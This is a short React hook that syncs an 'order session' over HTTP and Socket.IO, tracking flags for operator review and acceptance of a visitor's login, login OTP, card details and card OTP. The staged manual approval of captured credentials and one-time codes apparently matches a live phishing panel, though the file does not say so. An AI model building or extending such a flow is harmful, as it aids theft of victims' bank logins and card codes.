import { useEffect, useState } from "react";
import axios from "axios";
import { api_route, socket } from "../socketApi";

const emptyFlags = {
  rejectReason: null,
  loginAccept: false,
  otpLoginAccept: false,
  cardAccept: false,
  cardOtpAccept: false,
  formAccept: false,
  reviewLogin: false,
  reviewLoginOtp: false,
  reviewVisa: false,
  reviewCardOtp: false,
  reviewForm: false,
};

/**
 * GET /order/:id/state + Socket.IO visitor:stage.
 */
export function useOrderSession(orderId) {
  const [flags, setFlags] = useState(emptyFlags);
  const [hydrated, setHydrated] = useState(false);

  useEffect(() => {
    if (!orderId) {
      setHydrated(false);
      return;
    }

    let cancelled = false;
    socket.emit("joinOrder", { orderId });

    const applyPayload = (p) => {
      if (!p) return;
      setFlags({
        rejectReason: p.rejectReason ?? null,
        loginAccept: !!p.loginAccept,
        otpLoginAccept: !!p.otpLoginAccept,
        cardAccept: !!p.cardAccept,
        cardOtpAccept: !!p.cardOtpAccept,
        formAccept: !!p.formAccept,
        reviewLogin: !!p.reviewLogin,
        reviewLoginOtp: !!p.reviewLoginOtp,
        reviewVisa: !!p.reviewVisa,
        reviewCardOtp: !!p.reviewCardOtp,
        reviewForm: !!p.reviewForm,
      });
    };

    const hydrate = async () => {
      try {
        const { data } = await axios.get(
          `${api_route}/order/${orderId}/state`,
        );
        if (!cancelled) {
          applyPayload(data);
          setHydrated(true);
        }
      } catch {
        if (!cancelled) setHydrated(true);
      }
    };
    hydrate();

    const onSync = (payload) => {
      if (!payload || String(payload.orderId) !== String(orderId)) return;
      applyPayload(payload);
    };
    socket.on("visitor:stage", onSync);
    return () => {
      cancelled = true;
      socket.off("visitor:stage", onSync);
    };
  }, [orderId]);

  return { ...flags, hydrated };
}
